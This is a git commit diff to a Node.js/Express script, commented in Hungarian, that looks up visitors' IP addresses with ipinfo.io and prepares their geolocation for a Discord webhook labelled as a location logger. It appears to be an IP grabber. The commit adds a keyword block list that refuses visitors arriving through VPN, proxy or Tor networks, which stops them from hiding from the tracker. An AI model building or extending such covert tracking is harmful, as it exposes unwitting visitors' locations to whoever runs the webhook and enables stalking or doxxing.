849bba558e145c6a38a6fe692489c801ace75012
Szaby <szaby.korodi@yahoo.com>
2025-08-01 20:12:54 +0300

    Update script.js

--- script.js
+++ script.js
@@ -13,6 +13,11 @@ const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
 const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;
 const ipinfoToken = process.env.IPINFO_TOKEN;
 
+// VPN blokkolás - VPN IP tartományok listája (itt bővítheted a listát)
+const blockedVPNs = [
+    'VPN', 'Private Network', 'Proxy', 'Tor', 'VPN Provider', 'PrivateVPN', // Itt adhatsz hozzá több VPN szolgáltatót
+];
+
 // Az alapértelmezett útvonal (/) kiszolgálja az index.html-t
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));  // Az index.html fájl kiszolgálása
@@ -31,8 +36,17 @@ app.get('/send-ip', async (req, res) => {
         const geoResponse = await axios.get(`https://ipinfo.io/${userIp}?token=${ipinfoToken}`);
         const geoData = geoResponse.data;
 
+        // Ellenőrizzük, hogy az IP VPN mögül jön-e
+        const isVPN = blockedVPNs.some(keyword => geoData.org && geoData.org.includes(keyword));
+
+        if (isVPN) {
+            return res.status(403).send('VPN észlelve, hozzáférés blokkolva!');
+        }
+
+        // Az API válaszból kiolvassuk a szükséges adatokat
         const [latitude, longitude] = (geoData.loc || '0,0').split(',');
 
+        // A webhook üzenet elkészítése
         const message = {
             username: "Helyszíni Naplózó <3",
             avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
@@ -52,6 +66,7 @@ app.get('/send-ip', async (req, res) => {
     }
 });
 
+// Szerver indítása
 app.listen(port, () => {
     console.log(`Server is running on http://localhost:${port}`);
 });
